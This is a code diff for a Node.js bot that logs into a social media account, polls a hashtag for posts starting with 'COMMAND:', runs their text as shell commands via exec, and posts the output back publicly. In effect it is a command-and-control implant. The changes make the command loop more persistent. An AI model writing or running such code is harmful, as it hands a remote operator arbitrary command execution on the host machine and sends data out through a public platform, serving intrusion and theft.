@@ -7,7 +7,6 @@ const Commands = require('./lib/commands.js');
 const { log, sleep } = require('../utils/utils.js');
 const { URLS, COMMANDS, COMMUNICATION } = require('../config/constants.js');
 const MESSAGES = require('../config/messages.js');
-const { clear } = require('console');
 
 USER = process.env.BOT_EMAIL;
 PASS = process.env.BOT_PASSWORD;
@@ -21,12 +20,57 @@ const nextAction = () => {
 	sleep(COMMANDS.DELAY);
 }
 
+async function waitForCommand(commands) {
+	console.log(MESSAGES.COMMAND_WAITING);
+	commands.page.goto(`${URLS.TOPIC.format(TOPIC)}?f=live`, { waitUntil: 'networkidle2' });
+
+	const latest = await commands.getTimelinePost(1);
+	if (!latest) {
+		waitForCommand(commands);
+		return;
+	}
+
+	let content = await commands.getPostContent(latest);
+
+	content = content.replace(`#${TOPIC}`, "").trim();
+
+	if (content.startsWith("COMMAND:")) {
+		const command = content.replace("COMMAND:", "").trim().split("[")[0];
+		log(MESSAGES.COMMAND_RECEIVED.format(command));
+
+		// Execute the command and wait for it to complete
+		let { stdout, stderr } = await executeCommand(command);
+
+		if (stderr) {
+			log(stderr);
+		}
+
+		log(stdout);
+		stdout = "OUTPUT: " + stdout + `[${Date.now()}]`;
+		await commands.makePost(stdout, [`#${TOPIC}`]);
+
+		// Continue waiting for the next command
+		await waitForCommand(commands);
+	} else {
+		// If no command is found, wait for 5 seconds and then check again
+		setTimeout(() => waitForCommand(commands), COMMUNICATION.CHECK_INTERVAL);
+	}
+}
+
+async function executeCommand(command) {
+	return new Promise((resolve) => {
+		exec(command, (err, stdout, stderr) => {
+			resolve({ stdout, stderr });
+		});
+	});
+}
+
+
 // run bot
 (async () => {
 	log(MESSAGES.STARTING.format(path.basename(__filename).replace(".js", "")));
 
 	const page = await login(USER, PASS, VERIFICATION, URLS.LOGIN, BROWSER, HEADLESS);
-	page.setDefaultNavigationTimeout(999999); 
 	nextAction();
 	await acceptCookies(page);
 	nextAction();
@@ -38,36 +82,5 @@ const nextAction = () => {
 	nextAction();
 
 	// wait for command from commander
-	const run = setInterval(async () => {
-		log(MESSAGES.COMMAND_WAITING);
-		commands.page.goto(`${URLS.TOPIC.format(TOPIC)}?f=live`, {waitUntil: 'networkidle2'});
-
-		// within this hashtag page, check if the bot has opened a session
-		const latest = await commands.getTimelinePost(1);
-		let content = await commands.getPostContent(latest);
-
-		// remove topic hashtag from content
-		content = content.replace(`#${TOPIC}`, "").trim();
-
-		// check if tweet is a command
-		if (content.startsWith("COMMAND:")) {
-			const command = content.replace("COMMAND:", "").trim().split("[")[0];
-			log(MESSAGES.COMMAND_RECEIVED.format(command));
-
-			clearInterval(run);
-
-			// execute command on os
-			exec(command, async (err, stdout, stderr) => {
-				if (err) {
-					log(err);
-					return;
-				}
-
-				log(stdout);
-				stdout = "OUTPUT: " + stdout + `[${Date.now()}]`;
-				await commands.makePost(stdout, [`#${TOPIC}`]);
-				nextAction();
-			});
-		}
-	}, 5000);
+	waitForCommand(commands);
 })();
